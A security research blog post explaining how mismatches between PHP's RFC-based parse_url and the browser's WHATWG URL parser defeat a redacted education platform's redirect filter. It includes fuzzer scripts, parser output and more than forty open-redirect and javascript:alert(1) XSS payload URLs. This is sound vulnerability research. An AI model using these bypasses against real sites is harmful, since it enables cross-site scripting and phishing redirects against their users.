Stenberg/DON’T MIX URL PARSERS ","date":"17 March 2023","externalUrl":null,"permalink":"/posts/a_research_of_inconsistencies_in_front_and_backend_url_parsers.en/","section":"Posts","summary":"2022年8月份在挖天融信SRC的时候，发现天融信的某个站点使用了redacted系统，于是便在github上下载了redacted的源码，审计了一下。","title":"对WHATWG URL标准与RFC URL标准不一致性的研究","type":"posts"},{"content":"","date":"17 March 2023","externalUrl":null,"permalink":"/en/","section":"1337妙妙屋","summary":"","title":"1337妙妙屋","type":"page"},{"content":"In August 2022, when digging the SRC of Tianrongxin, I found that redacted teaching and training system was used in a site of Tianrongxin Education, so I downloaded the source code of redacted on github and audited it.\nSource \u0026amp; Sink # According to the audit, redacted Education and training system uses goto parameter in many places to achieve page redirection, such as login function:\nhttp://demo.redacted.com/login?goto=/ If a logged-in user accesses this URL, the back-end reads the value of the goto parameter and fills it into the custom property data-goto of the div tag in the twig template:\n{% block content %} \u0026lt;div id=\u0026#34;page-message-container\u0026#34; class=\u0026#34;page-message-container\u0026#34; data-goto=\u0026#34;{{ goto }}\u0026#34; data-duration={{ duration }}\u0026gt; \u0026lt;div class=\u0026#34;page-message-panel\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;page-message-heading\u0026#34;\u0026gt; \u0026lt;h2 class=\u0026#34;page-message-title\u0026#34;\u0026gt;{{ title|trans }}\u0026lt;/h2\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;page-message-body\u0026#34;\u0026gt;{{ message|default(\u0026#39;\u0026#39;)|trans|raw }}\u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; {% endblock %} Then, the front-end reads the value of data-goto property through the following js code, and jumps to the page through window.location.href :\nfunction (e, t) { var n = $(\u0026#34;#page-message-container\u0026#34;), r = n.data(\u0026#34;goto\u0026#34;), o = n.data(\u0026#34;duration\u0026#34;); o \u0026gt; 0 \u0026amp;\u0026amp; r \u0026amp;\u0026amp; setTimeout((function () { window.location.href = r }), o) } Sanitizer/Filter # In order to prevent the occurrence of open redirection vulnerability (OR) and XSS in the process of page redirection, redacted specially writes a filter on the back end to filter the URL in the goto parameter:\n/ * * * Filter urls. * * If the url does not belong to a domain name other than this site, return to the home address of this site. * * @param $url string $url to be filtered * * @return string * / public function filterRedirectUrl($url) { $host = $this-\u0026gt;get(\u0026#39;request_stack\u0026#39;)-\u0026gt;getCurrentRequest()-\u0026gt;getHost(); $safeHosts = [$host]; $parsedUrl = parse_url($url); $isUnsafeHost = isset($parsedUrl[\u0026#39;host\u0026#39;]) \u0026amp;\u0026amp; ! in_array($parsedUrl[\u0026#39;host\u0026#39;], $safeHosts); $isInvalidUrl = isset($parsedUrl[\u0026#39;scheme\u0026#39;]) \u0026amp;\u0026amp; ! in_array($parsedUrl[\u0026#39;scheme\u0026#39;], [\u0026#39;http\u0026#39;, \u0026#39;https\u0026#39;]); if (empty($url) || $isUnsafeHost || $isInvalidUrl) { $url = $this-\u0026gt;generateUrl(\u0026#39;homepage\u0026#39;, [], UrlGeneratorInterface::ABSOLUTE_URL); } return strip_tags($url); } The filter works as follows:\nObtain the Host header in the http request packet and use it as the host whitelist Set protocol whitelists to http and https Use PHP\u0026rsquo;s URL parser to parse the incoming URL and get the host part and scheme part If the host part and the scheme part exist, check whether the host part belongs to the host whitelist and the scheme part belongs to the scheme whitelist Otherwise, it is assumed that the user passed in a relative URL Bypass the host check # How do I bypass filter\u0026rsquo;s host check? The following payload comes to mind:\nhttps://demo.redacted.com/login?goto=http://baidu.com\\@demo.redacted.com/ The payload works because of the inconsistency between the front-end and back-end URL parsers:\nparse_url of PHP considers the host part of the URL to be demo.redacted.com, which is the same as the Host request in the http request packet. Therefore, the check is passed. But the javascript URL parser doesn\u0026rsquo;t think so: the js URL parser normalizes \\ to /, so the payload is normalized into the following URL: http://baidu.com/@demo.redacted.com/ Therefore, the front-end considers the host part of the URL to be baidu.com.\nPHP URL parser:\nphp -r \u0026#34;var_dump(parse_url(\u0026#39;http://baidu.com\\@demo.redacted.com/\u0026#39;));\u0026#34; Command line code:1: array(4) { \u0026#39;scheme\u0026#39; =\u0026gt; string(4) \u0026#34;http\u0026#34; \u0026#39;host\u0026#39; =\u0026gt; string(16) \u0026#34;demo.redacted.com\u0026#34; \u0026#39;user\u0026#39; =\u0026gt; string(10) \u0026#34;baidu.com\\\u0026#34; \u0026#39;path\u0026#39; =\u0026gt; string(1) \u0026#34;/\u0026#34; } Javascript URL parser:\n\u0026gt; new URL(\u0026#39;http://baidu.com\\\\@demo.redacted.com/\u0026#39;) URL {origin: \u0026#39;http://baidu.com\u0026#39;, protocol: \u0026#39;http:\u0026#39;, username: \u0026#39;, password: \u0026#39;, host: \u0026#39;baidu.com\u0026#39;,... } hash: \u0026#34;\u0026#34; host: \u0026#34;baidu.com\u0026#34; hostname: \u0026#34;baidu.com\u0026#34; href: \u0026#34;http://baidu.com/@demo.redacted.com/\u0026#34; origin: \u0026#34;http://baidu.com\u0026#34; password: \u0026#34;\u0026#34; pathname: \u0026#34;/@demo.redacted.com/\u0026#34; port: \u0026#34;\u0026#34; protocol: \u0026#34;http:\u0026#34; search: \u0026#34;\u0026#34; searchParams: URLSearchParams {} username: \u0026#34;\u0026#34; A point of note when \\ is the js escape symbol, such as: hexadecimal encoding \\x61, and control character encoding \\n\u0026hellip;\nSo it\u0026rsquo;s escaped again in the demo code above\nBypass scheme check # By simply bypassing host checking, we can only create an open redirection vulnerability. To cause xss, we also need to bypass protocol checking on the back end. How do we bypass protocol checking on the back end?\nWe can try to start with the following idea: since vulnerability are often due to some false assumptions of the program, we can try to find out what false assumptions filter has, and then try to break it.\n$parsedUrl = parse_url($url); $isUnsafeHost = isset($parsedUrl[\u0026#39;host\u0026#39;]) \u0026amp;\u0026amp; ! in_array($parsedUrl[\u0026#39;host\u0026#39;], $safeHosts); $isInvalidUrl = isset($parsedUrl[\u0026#39;scheme\u0026#39;]) \u0026amp;\u0026amp; ! in_array($parsedUrl[\u0026#39;scheme\u0026#39;], [\u0026#39;http\u0026#39;, \u0026#39;https\u0026#39;]); if (empty($url) || $isUnsafeHost || $isInvalidUrl) { $url = $this-\u0026gt;generateUrl(\u0026#39;homepage\u0026#39;, [], UrlGeneratorInterface::ABSOLUTE_URL); } return strip_tags($url); Looking back at the filter code above, filter assumes:\nIf the host and scheme parts cannot be resolved from the URL, it must be a relative URL Relative URL must be secure. So what happens if we make parse_url return false?\nfalse[\u0026#39;host\u0026#39;] === NULL false[\u0026#39;scheme\u0026#39;] === NULL parse_url will assume that the URL passed in by the user has no host and scheme parts, so it\u0026rsquo;s a relative URL! Relative urls must be safe and can be returned directly to the front end.\nHow do we make parse_url return false?\nThe PHP URL parser is just an implementation of the RFC standard, so if the URL passed in does not conform to the RFC specification, then the parse_url will return false\nA classic payload, for example, is a much simpler way to cause open redirects:\nhttps://demo.redacted.com/login?goto=http:///baidu.com RFC 1738 states that the absolute URL of the hierarchy must exclude the protocol part and subsequent parts must begin with //\nThe scheme specific data start with a double slash \u0026ldquo;//\u0026rdquo; to indicate that it complies with the common Internet scheme syntax.\nSo PHP\u0026rsquo;s URL parser thinks that http:///baidu.com is an illegal URL, so it simply returns false, bypassing the follow-up check and returning it to the front end.\nBut the front-end URL parser doesn\u0026rsquo;t think so, and normalizes http:///baidu.com to http://baidu.com:\n\u0026gt; new URL(\u0026#39;http:///baidu.com\u0026#39;) URL {origin: \u0026#39;http://baidu.com\u0026#39;, protocol: \u0026#39;http:\u0026#39;, username: \u0026#39;, password: \u0026#39;, host: \u0026#39;baidu.com\u0026#39;,... } hash: \u0026#34;\u0026#34; host: \u0026#34;baidu.com\u0026#34; hostname: \u0026#34;baidu.com\u0026#34; href: \u0026#34;http://baidu.com/\u0026#34; origin: \u0026#34;http://baidu.com\u0026#34; password: \u0026#34;\u0026#34; pathname: \u0026#34;/\u0026#34; port: \u0026#34;\u0026#34; protocol: \u0026#34;http:\u0026#34; search: \u0026#34;\u0026#34; searchParams: URLSearchParams {} username: \u0026#34;\u0026#34; So there is an OR vulnerability.\nWhat about swapping http for javascript? The RFC document only specifies that hierarchical urls must contain the \u0026lsquo;//\u0026rsquo; prefix, but does not specify what should the URL parser do if a non-hierarchical URL contains a \u0026lsquo;//\u0026rsquo; prefix\nfor example:\njavascript:alert(1) ---\u0026gt; javascript://alert(1) mailto:happyhacking@qq.com ---\u0026gt; mailto://happyhacking@qq.com So I thought of payload:\nhttps://demo.redacted.com/login?goto=javascript:///%250dalert(1) PHP\u0026rsquo;s URL parser considers javascript:///%250dalert(1) to be an illegal URL and returns false, so filter skips protocol checking and simply considers it to be a safe relative URL.\nphp -r \u0026#34;var_dump(parse_url(\u0026#39;javascript:///%250dalert(1)\u0026#39;));\u0026#34; Command line code:1: bool(false) But the front-end URL parser has its own ideas:\nThe payload reflected to the front looks like this:\nwindow.location.href = \u0026#39;javascript:///%0dalert(1)\u0026#39; The front-end URL parser decodes the URL first, decoding \u0026lsquo;%0d\u0026rsquo; into \u0026lsquo;\\n\u0026rsquo;, and the protocol parsed into is named javascript, so it switches to the js resolver, which thinks\u0026rsquo; // \u0026lsquo;is a single line comment, alert(1) is the next line of js code after the newline.\nSo we have a XSS vulnerability!\nFurther Research # Can we further search for more inconsistencies between the js URL parser and the php URL parser by writing fuzzer?\nQustion1: http:{char}//localhost:80/xxxx # Can we find a character between http: and // that the front-end URL parser still considers the host part of the URL to be localhost after we fill it into the {char} position?\nSo I wrote the following fuzzer:\nlog=[]; for(i=0;i\u0026lt;0x10ffff;i++){ try{ let url = new URL(\u0026#39;http:\u0026#39;+String.fromCodePoint(i)+\u0026#39;//localhost:80/xxxx\u0026#39;) if(url[\u0026#39;host\u0026#39;] == \u0026#39;localhost\u0026#39; ){ console.log(i+\u0026#39; URL encoded i : \u0026#39;+encodeURI(String.fromCodePoint(i))) log.push(i); } }catch(e){} } log Output:\n9 URL encoded i : %09 10 URL encoded i : %0A 13 URL encoded i : %0D 47 URL encoded i : / 92 URL encoded i : %5C (5) [9, 10, 13, 47, 92] So how does PHP\u0026rsquo;s URL parser parse_url parse these payloads?\n[\u0026#34;http:%09//localhost\u0026#34;]=\u0026gt; array(2) { [\u0026#34;scheme\u0026#34;]=\u0026gt; string(4) \u0026#34;http\u0026#34; [\u0026#34;path\u0026#34;]=\u0026gt; string(14) \u0026#34;%09//localhost\u0026#34; } [\u0026#34;http: //localhost\u0026#34;]=\u0026gt; array(2) { [\u0026#34;scheme\u0026#34;]=\u0026gt; string(4) \u0026#34;http\u0026#34; [\u0026#34;path\u0026#34;]=\u0026gt; string(14) \u0026#34; //localhost\u0026#34; } [\u0026#34;http:%0a//localhost\u0026#34;]=\u0026gt; array(2) { [\u0026#34;scheme\u0026#34;]=\u0026gt; string(4) \u0026#34;http\u0026#34; [\u0026#34;path\u0026#34;]=\u0026gt; string(14) \u0026#34;%0a//localhost\u0026#34; } [\u0026#34;http:\\//localhost\u0026#34;]=\u0026gt; array(2) { [\u0026#34;scheme\u0026#34;]=\u0026gt; string(4) \u0026#34;http\u0026#34; [\u0026#34;path\u0026#34;]=\u0026gt; string(12) \u0026#34;\\//localhost\u0026#34; } [\u0026#34;http:///localhost\u0026#34;]=\u0026gt; bool(false) As you can see, the parse_url faced with these payloads, either thinks that everything after http: is the path portion, or it thinks that the URL is an illegal URL and returns false\nIn other words, the following payloads can also bypass redacted\u0026rsquo;s URL filter, causing open redirects:\nhttps://demo.redacted.com/login?goto=http:\\//www.baidu.com https://demo.redacted.com/login?goto=http:%0d\\\\www.baidu.com https://demo.redacted.com/login?goto=http:%0a\\\\www.baidu.com https://demo.redacted.com/login?goto=http:%09\\\\www.baidu.com Question2: http{char}://localhost:80/xxxx # Can we find a character between \u0026lsquo;http\u0026rsquo; and \u0026lsquo;://\u0026rsquo; that still makes the front-end URL parser think that the host part of the URL is localhost and the scheme part is http?\nlog=[]; for(i=0;i\u0026lt;0x10ffff;i++){ try{ let url = new URL(\u0026#39;http\u0026#39;+String.fromCodePoint(i)+\u0026#39;://localhost:80/xxxx\u0026#39;) if(url[\u0026#39;host\u0026#39;] == \u0026#39;localhost\u0026#39; \u0026amp;\u0026amp; url[\u0026#39;protocol\u0026#39;] == \u0026#39;http:\u0026#39;){ console.log(\u0026#39;i: \u0026#39;+i+\u0026#39; URL encoded i : \u0026#39;+encodeURI(String.fromCodePoint(i))); console.log(url); log.push(i); } }catch(e){} } log Running results of the front-end URL parser:\nVM437:7 9: URL encoded i : %09 VM437:7 10: URL encoded i : %0A VM437:7 13: URL encoded i : %0D This time it only gets three characters, minus /and \\, and gets the following three payloads\nhttp%09://baidu.com http%0a://baidu.com http%0d://baidu.com How does PHP\u0026rsquo;s URL parser parse these payloads?\n[\u0026#34;http%09://localhost:80/xxx\u0026#34;]=\u0026gt; array(1) { [\u0026#34;path\u0026#34;]=\u0026gt; string(26) \u0026#34;http%09://localhost:80/xxx\u0026#34; } [\u0026#34;http%0a://localhost:80/xxx\u0026#34;]=\u0026gt; array(1) { [\u0026#34;path\u0026#34;]=\u0026gt; string(26) \u0026#34;http%0a://localhost:80/xxx\u0026#34; } [\u0026#34;http%0d://localhost:80/xxx\u0026#34;]=\u0026gt; array(1) { [\u0026#34;path\u0026#34;]=\u0026gt; string(26) \u0026#34;http%0d://localhost:80/xxx\u0026#34; } This bypasses both filter\u0026rsquo;s protocol check and host check:\nwindow.location.href=\u0026#39;http%0a://localhost:80/xxx\u0026#39; // exception window.location.href=\u0026#39;http\\n://localhost:80/xxx\u0026#39; // work window.location.href=\u0026#39;javascript\\n:alert(1)\u0026#39; // work window.location.href=\u0026#39;javascript\\r:alert(1)\u0026#39; // work window.location.href=\u0026#39;javascript\\t:alert(1)\u0026#39; // work payload:\nhttps://demo.redacted.com/login?goto=javascript%0d:alert(1) //work！ https://demo.redacted.com/login?goto=javascript%0a:alert(1) //work！ https://demo.redacted.com/login?goto=javascript%09:alert(1) //work！ https://demo.redacted.com/login?goto=http%09://baidu.com //work Question3: {char}http://localhost:80/xxxx # Can we find a character before the \u0026lsquo;http\u0026rsquo; protocol, fill it in, and still make the front-end URL parser think that the host part of the URL is localhost and the scheme part is http?\nlog=[]; for(i=0;i\u0026lt;0x10ffff;i++){ try{ let url = new URL(String.fromCodePoint(i)+\u0026#39;http://localhost:80/xxxx\u0026#39;) if(url[\u0026#39;host\u0026#39;] == \u0026#39;localhost\u0026#39; \u0026amp;\u0026amp; url[\u0026#39;protocol\u0026#39;] == \u0026#39;http:\u0026#39;){ console.log(`i: ${i} ,URL encoded i : `+encodeURI(String.fromCodePoint(i))+\u0026#39; string begin:\u0026#39;+String.fromCodePoint(i)+\u0026#39;string end\u0026#39;) log.push(i); } }catch(e){} } log log.forEach(i=\u0026gt;{ //console.log(encodeURI(String.fromCodePoint(i))+\u0026#39;http://localhost:80/xxxx\u0026#39;) console.log(encodeURI(String.fromCodePoint(i))+\u0026#39;javascript:alert(1)\u0026#39;) }) payloads:\n%00http://localhost:80/xxxx %01http://localhost:80/xxxx %02http://localhost:80/xxxx %03http://localhost:80/xxxx %04http://localhost:80/xxxx %05http://localhost:80/xxxx %06http://localhost:80/xxxx %07http://localhost:80/xxxx %08http://localhost:80/xxxx %09http://localhost:80/xxxx %0Ahttp://localhost:80/xxxx %0Bhttp://localhost:80/xxxx %0Chttp://localhost:80/xxxx %0Dhttp://localhost:80/xxxx %0Ehttp://localhost:80/xxxx %0Fhttp://localhost:80/xxxx %10http://localhost:80/xxxx %11http://localhost:80/xxxx %12http://localhost:80/xxxx %13http://localhost:80/xxxx %14http://localhost:80/xxxx %15http://localhost:80/xxxx %16http://localhost:80/xxxx %17http://localhost:80/xxxx %18http://localhost:80/xxxx %19http://localhost:80/xxxx %1Ahttp://localhost:80/xxxx %1Bhttp://localhost:80/xxxx %1Chttp://localhost:80/xxxx %1Dhttp://localhost:80/xxxx %1Ehttp://localhost:80/xxxx %1Fhttp://localhost:80/xxxx %20http://localhost:80/xxxx Replace the http protocol with the javascript protocol:\n%00javascript:alert(1) %01javascript:alert(1) %02javascript:alert(1) %03javascript:alert(1) %04javascript:alert(1) %05javascript:alert(1) %06javascript:alert(1) %07javascript:alert(1) %08javascript:alert(1) %09javascript:alert(1) %0Ajavascript:alert(1) %0Bjavascript:alert(1) %0Cjavascript:alert(1) %0Djavascript:alert(1) %0Ejavascript:alert(1) %0Fjavascript:alert(1) %10javascript:alert(1) %11javascript:alert(1) %12javascript:alert(1) %13javascript:alert(1) %14javascript:alert(1) %15javascript:alert(1) %16javascript:alert(1) %17javascript:alert(1) %18javascript:alert(1) %19javascript:alert(1) %1Ajavascript:alert(1) %1Bjavascript:alert(1) %1Cjavascript:alert(1) %1Djavascript:alert(1) %1Ejavascript:alert(1) %1Fjavascript:alert(1) %20javascript:alert(1) How does PHP\u0026rsquo;s URL parser parse these payloads?\n[\u0026#34;%00http://localhost:80/xxxx\u0026#34;]=\u0026gt; array(1) { [\u0026#34;path\u0026#34;]=\u0026gt; string(27) \u0026#34;%00http://localhost:80/xxxx\u0026#34; } [\u0026#34;%01http://localhost:80/xxxx\u0026#34;]=\u0026gt; array(1) { [\u0026#34;path\u0026#34;]=\u0026gt; string(27) \u0026#34;%01http://localhost:80/xxxx\u0026#34; } [\u0026#34;%1Djavascript:alert(1)\u0026#34;]=\u0026gt; array(1) { [\u0026#34;path\u0026#34;]=\u0026gt; string(22) \u0026#34;%1Djavascript:alert(1)\u0026#34; } [\u0026#34;%1Ejavascript:alert(1)\u0026#34;]=\u0026gt; array(1) { [\u0026#34;path\u0026#34;]=\u0026gt; string(22) \u0026#34;%1Ejavascript:alert(1)\u0026#34; } PHP\u0026rsquo;s URL parser considers the entire URL to be a relative URL\nTherefore, the following payloads can bypass protocol check and host check of the redacted filter:\nhttps://demo.redacted.com/login?goto=%00javascript:alert(1) https://demo.redacted.com/login?goto=%01javascript:alert(1) https://demo.redacted.com/login?goto=%02javascript:alert(1) https://demo.redacted.com/login?goto=%03javascript:alert(1) https://demo.redacted.com/login?goto=%04javascript:alert(1) https://demo.redacted.com/login?goto=%05javascript:alert(1) https://demo.redacted.com/login?goto=%06javascript:alert(1) https://demo.redacted.com/login?goto=%07javascript:alert(1) https://demo.redacted.com/login?goto=%08javascript:alert(1) https://demo.redacted.com/login?goto=%09javascript:alert(1) https://demo.redacted.com/login?goto=%0Ajavascript:alert(1) https://demo.redacted.com/login?goto=%0Bjavascript:alert(1) https://demo.redacted.com/login?goto=%0Cjavascript:alert(1) https://demo.redacted.com/login?goto=%0Djavascript:alert(1) https://demo.redacted.com/login?goto=%0Ejavascript:alert(1) https://demo.redacted.com/login?goto=%0Fjavascript:alert(1) https://demo.redacted.com/login?goto=%10javascript:alert(1) https://demo.redacted.com/login?goto=%11javascript:alert(1) https://demo.redacted.com/login?goto=%12javascript:alert(1) https://demo.redacted.com/login?goto=%13javascript:alert(1) https://demo.redacted.com/login?goto=%14javascript:alert(1) https://demo.redacted.com/login?goto=%15javascript:alert(1) https://demo.redacted.com/login?goto=%16javascript:alert(1) https://demo.redacted.com/login?goto=%17javascript:alert(1) https://demo.redacted.com/login?goto=%18javascript:alert(1) https://demo.redacted.com/login?goto=%19javascript:alert(1) https://demo.redacted.com/login?goto=%1Ajavascript:alert(1) https://demo.redacted.com/login?goto=%1Bjavascript:alert(1) https://demo.redacted.com/login?goto=%1Cjavascript:alert(1) https://demo.redacted.com/login?goto=%1Djavascript:alert(1) https://demo.redacted.com/login?goto=%1Ejavascript:alert(1) https://demo.redacted.com/login?goto=%1Fjavascript:alert(1) https://demo.redacted.com/login?goto=%20javascript:alert(1) Question4: ht{char}tp://localhost:80/xxxx # Let\u0026rsquo;s be a little more adventurous, can we find a character between ht and tp that the front-end URL parser still thinks the scheme part of the URL is http and the host part is localhost?\nfuzzer:\nlog=[]; for(i=0;i\u0026lt;0x10ffff;i++){ try{ let url = new URL(\u0026#39;ht\u0026#39;+String.fromCodePoint(i)+\u0026#39;tp://localhost:80/xxxx\u0026#39;) if(url[\u0026#39;host\u0026#39;] == \u0026#39;localhost\u0026#39; \u0026amp;\u0026amp; url[\u0026#39;protocol\u0026#39;] == \u0026#39;http:\u0026#39;){ console.log(\u0026#39;i: \u0026#39;+i+\u0026#39; URL encoded i : \u0026#39;+encodeURI(String.fromCodePoint(i))); console.log(url); log.push(i); } }catch(e){} } log Output:\ni: 9 URL encoded i : %09 debugger eval code:6:13 URL { href: \u0026#34;http://localhost/xxxx\u0026#34;, origin: \u0026#34;http://localhost\u0026#34;, protocol: \u0026#34;http:\u0026#34;, username: \u0026#34;\u0026#34;, password: \u0026#34;\u0026#34;, host: \u0026#34;localhost\u0026#34;, hostname: \u0026#34;localhost\u0026#34;, port: \u0026#34;\u0026#34;, pathname: \u0026#34;/xxxx\u0026#34;, search: \u0026#34;\u0026#34; } debugger eval code:7:13 i: 10 URL encoded i : %0A debugger eval code:6:13 URL { href: \u0026#34;http://localhost/xxxx\u0026#34;, origin: \u0026#34;http://localhost\u0026#34;, protocol: \u0026#34;http:\u0026#34;, username: \u0026#34;\u0026#34;, password: \u0026#34;\u0026#34;, host: \u0026#34;localhost\u0026#34;, hostname: \u0026#34;localhost\u0026#34;, port: \u0026#34;\u0026#34;, pathname: \u0026#34;/xxxx\u0026#34;, search: \u0026#34;\u0026#34; } debugger eval code:7:13 i: 13 URL encoded i : %0D debugger eval code:6:13 URL { href: \u0026#34;http://localhost/xxxx\u0026#34;, origin: \u0026#34;http://localhost\u0026#34;, protocol: \u0026#34;http:\u0026#34;, username: \u0026#34;\u0026#34;, password: \u0026#34;\u0026#34;, host: \u0026#34;localhost\u0026#34;, hostname: \u0026#34;localhost\u0026#34;, port: \u0026#34;\u0026#34;, pathname: \u0026#34;/xxxx\u0026#34;, search: \u0026#34;\u0026#34; } debugger eval code:7:13 Array(3) [ 9, 10, 13 ] payloads:\nht%0dtp://localhost ht%0atp://localhost ht%09tp://localhost java%09script:alert(1) java%0dscript:alert(1) java%0ascript:alert(1) So how does PHP\u0026rsquo;s URL parser handle these malformed urls?\n[\u0026#34;ht%0dtp://localhost\u0026#34;]=\u0026gt; array(1) { [\u0026#34;path\u0026#34;]=\u0026gt; string(19) \u0026#34;ht%0dtp://localhost\u0026#34; } [\u0026#34;ht%0atp://localhost\u0026#34;]=\u0026gt; array(1) { [\u0026#34;path\u0026#34;]=\u0026gt; string(19) \u0026#34;ht%0atp://localhost\u0026#34; } [\u0026#34;ht%09tp://localhost\u0026#34;]=\u0026gt; array(1) { [\u0026#34;path\u0026#34;]=\u0026gt; string(19) \u0026#34;ht%09tp://localhost\u0026#34; } [\u0026#34;java%09script:alert(1)\u0026#34;]=\u0026gt; array(1) { [\u0026#34;path\u0026#34;]=\u0026gt; string(22) \u0026#34;java%09script:alert(1)\u0026#34; } [\u0026#34;java%0dscript:alert(1)\u0026#34;]=\u0026gt; array(1) { [\u0026#34;path\u0026#34;]=\u0026gt; string(22) \u0026#34;java%0dscript:alert(1)\u0026#34; } [\u0026#34;java%0ascript:alert(1)\u0026#34;]=\u0026gt; array(1) { [\u0026#34;path\u0026#34;]=\u0026gt; string(22) \u0026#34;java%0ascript:alert(1)\u0026#34; } Once again, PHP\u0026rsquo;s URL parser considers these urls to be \u0026lsquo;canonical\u0026rsquo; relative urls, all of which pass redacted fitler\u0026rsquo;s check\nhttps://demo.redacted.com/login?goto=ht%0dtp://baidu.com https://demo.redacted.com/login?goto=ht%0atp://baidu.com https://demo.redacted.com/login?goto=ht%09tp://baidu.com https://demo.redacted.com/login?goto=java%09script:alert(1) https://demo.redacted.com/login?goto=java%0dscript:alert(1) https://demo.redacted.com/login?goto=java%0ascript:alert(1) These three characters can actually be placed anywhere in scheme:\nhttps://demo.redacted.com/login?goto=java%0asc%0aript:alert(1) Summary # By further studying the inconsistency between javascript URL parser and php URL parser, I found more than 40 methods to bypass redacted filter:\nhttps://demo.redacted.com/login?goto=http://baidu.com\\@demo.redacted.com/ https://demo.redacted.com/login?goto=javascript:///%250dalert(1) https://demo.redacted.com/login?goto=http:///www.baidu.com https://demo.redacted.com/login?goto=http:\\//www.baidu.com https://demo.redacted.com/login?goto=http:%0d\\\\www.baidu.com https://demo.redacted.com/login?goto=http:%0a\\\\www.baidu.com https://demo.redacted.com/login?goto=http:%09\\\\www.baidu.com https://demo.redacted.com/login?goto=javascript%0d:alert(1) https://demo.redacted.com/login?goto=javascript%0a:alert(1) https://demo.redacted.com/login?goto=javascript%09:alert(1) https://demo.redacted.com/login?goto=http%09://baidu.com https://demo.redacted.com/login?goto=%00javascript:alert(1) https://demo.redacted.com/login?goto=%01javascript:alert(1) https://demo.redacted.com/login?goto=%02javascript:alert(1) https://demo.redacted.com/login?goto=%03javascript:alert(1) https://demo.redacted.com/login?goto=%04javascript:alert(1) https://demo.redacted.com/login?goto=%05javascript:alert(1) https://demo.redacted.com/login?goto=%06javascript:alert(1) https://demo.redacted.com/login?goto=%07javascript:alert(1) https://demo.redacted.com/login?goto=%08javascript:alert(1) https://demo.redacted.com/login?goto=%09javascript:alert(1) https://demo.redacted.com/login?goto=%0Ajavascript:alert(1) https://demo.redacted.com/login?goto=%0Bjavascript:alert(1) https://demo.redacted.com/login?goto=%0Cjavascript:alert(1) https://demo.redacted.com/login?goto=%0Djavascript:alert(1) https://demo.redacted.com/login?goto=%0Ejavascript:alert(1) https://demo.redacted.com/login?goto=%0Fjavascript:alert(1) https://demo.redacted.com/login?goto=%10javascript:alert(1) https://demo.redacted.com/login?goto=%11javascript:alert(1) https://demo.redacted.com/login?goto=%12javascript:alert(1) https://demo.redacted.com/login?goto=%13javascript:alert(1) https://demo.redacted.com/login?goto=%14javascript:alert(1) https://demo.redacted.com/login?goto=%15javascript:alert(1) https://demo.redacted.com/login?goto=%16javascript:alert(1) https://demo.redacted.com/login?goto=%17javascript:alert(1) https://demo.redacted.com/login?goto=%18javascript:alert(1) https://demo.redacted.com/login?goto=%19javascript:alert(1) https://demo.redacted.com/login?goto=%1Ajavascript:alert(1) https://demo.redacted.com/login?goto=%1Bjavascript:alert(1) https://demo.redacted.com/login?goto=%1Cjavascript:alert(1) https://demo.redacted.com/login?goto=%1Djavascript:alert(1) https://demo.redacted.com/login?goto=%1Ejavascript:alert(1) https://demo.redacted.com/login?goto=%1Fjavascript:alert(1) https://demo.redacted.com/login?goto=%20javascript:alert(1) https://demo.redacted.com/login?goto=ht%0dtp://baidu.com https://demo.redacted.com/login?goto=ht%0atp://baidu.com https://demo.redacted.com/login?goto=ht%09tp://baidu.com https://demo.redacted.com/login?goto=java%09script:alert(1) https://demo.redacted.com/login?goto=java%0dscript:alert(1) https://demo.redacted.com/login?goto=java%0ascript:alert(1) https://demo.redacted.com/login?goto=java%0asc%0aript:alert(1) The root cause # Why is there such a big inconsistency between javascript URL parser and PHP URL parser?\nBecause there are two URL resolution standards: the RFC standard and the WHATWG standard\njavascript URL parser follows the WHATWG standard, while PHP URL parser and other back-end language(excluding Nodejs) URL Parsers follow the RFC specification !\nThe WHATWG has developed its own set of standards based on the RFC standard: URL parsing Here\u0026rsquo;s what the WHATWG spec says:\nIf input contains any leading or trailing C0 control or space, validation error. Remove any leading and trailing C0 control or space from input. If the input URL starts and ends with the C0 controller and space, a validtion error is reported and all the C0 controllers and Spaces given in the input are deleted, where the range of C0 control is: 0x00-0x1F, the range of space is 0x20, so the range of C0 control + space is 0x00-0x20\nSo what is the validation error?\nThe WHATWG standard is to say:\nA validation error indicates a mismatch between input and valid input. User agents, especially conformance checkers, are encouraged to report them somewhere.A validation error does not mean that the parser terminates. Termination of a parser is always stated explicitly, e.g., through a return statement.\nA validtion error simply indicates a mismatch between input and valid input, and does not imply parsing termination. The standard encourages implementers to report it somewhere, and parser termination is always explicitly stated, for example, by a return statement.\nThat\u0026rsquo;s why these payloads work:\nhttps://demo.redacted.com/login?goto=%00javascript:alert(1) https://demo.redacted.com/login?goto=%01javascript:alert(1) https://demo.redacted.com/login?goto=%02javascript:alert(1) ... https://demo.redacted.com/login?goto=%20javascript:alert(1) And then the WHATWG standard says:\nIf input contains any ASCII tab or newline, validation error. Remove all ASCII tab or newline from input. Scope of ASCII TAB or newline:\nAn ASCII tab or newline is U+0009 TAB, U+000A LF, or U+000D CR.\nThat\u0026rsquo;s why these payloads work:\nhttps://demo.redacted.com/login?goto=ht%0dtp://baidu.com https://demo.redacted.com/login?goto=ht%0atp://baidu.com https://demo.redacted.com/login?goto=ht%09tp://baidu.com https://demo.redacted.com/login?goto=java%09script:alert(1) https://demo.redacted.com/login?goto=java%0dscript:alert(1) https://demo.redacted.com/login?goto=java%0ascript:alert(1) https://demo.redacted.com/login?goto=java%0asc%0aript:alert(1) This means that %0d %0a %09 can be placed anywhere in the URL, since js URL parser will remove them anyway, for example\nnew URL(\u0026#39;http:/\\x09/baidu.com\u0026#39;) URL { origin: \u0026#39;http://baidu.com\u0026#39;, protocol: \u0026#39;http:\u0026#39;, username: \u0026#39;\u0026#39;, password: \u0026#39;\u0026#39;, host: \u0026#39;baidu.com\u0026#39; } Summary # The worst thing in the world is having two sets of standards for the same thing. If there is inconsistency in the standards, there will inevitably be inconsistency in the implementation. Security issues arising from inconsistencies are concealed because when you audit a single system, you may think there are no security problems. However, when you connect multiple systems to work together, security issues will emerge. This also illustrates that when auditing security issues, it is necessary to consider the overall situation rather than auditing a single system.\nAt the same time, it is worth noting that wherever standards and specifications are not clearly defined or ambiguous, there will be discrepancies in understanding among developers who implement the standards. This can lead to inconsistencies between various languages, libraries, frameworks, and software that follow the standard implementation. Such inconsistencies are fertile ground for creating new attack techniques.\nKeep in touch # If you have any questions or good research direction, please feel free to contact me:\nEmail: hdrw1024@gmail.com Twitter: 